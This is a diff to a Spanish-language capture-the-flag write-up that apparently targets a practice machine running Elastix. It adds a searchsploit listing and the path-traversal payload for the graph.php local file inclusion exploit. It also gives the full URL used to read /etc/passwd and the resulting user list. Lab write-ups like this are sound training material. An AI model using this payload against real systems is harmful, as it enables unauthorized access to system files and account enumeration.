@@ -58,5 +58,43 @@ gobuster -u https://10.10.10.7/ -w /usr/share/dirb/wordlists/big.txt -t 100 -k
 /vtigercrm (Status: 301)
 /var (Status: 301)
 ```
-Accediendo a la web vemos que la tecnología usada es Elastix
+Accediendo a la web vemos que la tecnología usada es Elastix, busquemos en Searchsploit
+```
+----------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                   |  Path
+----------------------------------------------------------------------------------------------------------------- ---------------------------------
+Elastix - 'page' Cross-Site Scripting                                                                            | php/webapps/38078.py
+Elastix - Multiple Cross-Site Scripting Vulnerabilities                                                          | php/webapps/38544.txt
+Elastix 2.0.2 - Multiple Cross-Site Scripting Vulnerabilities                                                    | php/webapps/34942.txt
+Elastix 2.2.0 - 'graph.php' Local File Inclusion                                                                 | php/webapps/37637.pl
+Elastix 2.x - Blind SQL Injection                                                                                | php/webapps/36305.txt
+Elastix < 2.5 - PHP Code Injection                                                                               | php/webapps/38091.php
+FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution                                                           | php/webapps/18650.py
+----------------------------------------------------------------------------------------------------------------- ---------------------------------
+```
+
+### Exploit
+
+Vamos a probar el LFI
+```URL
+https://www.exploit-db.com/exploits/37637
+```
+Checkeando el exploit vemos que para explotar el LFI usamos el siguiente payload
+```
+payload = Hostname + '/vtigercrm/graph.php?current_language=../../../../../../../../' + RouteToFile + '%00&module=Accounts&action'
+```
+Accedamos a /etc/passwd para enumerar usuarios con acceso via terminal
+```
+https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/passwd%00&module=Accounts&action
+
+root:x:0:0:root:/root:/bin/bash
+mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash
+cyrus:x:76:12:Cyrus IMAP Server:/var/lib/imap:/bin/bash
+asterisk:x:100:101:Asterisk VoIP PBX:/var/lib/asterisk:/bin/bash
+spamfilter:x:500:500::/home/spamfilter:/bin/bash
+fanis:x:501:501::/home/fanis:/bin/bash
+```
+Tenemos 6 usuarios disponibles
+
+```
 
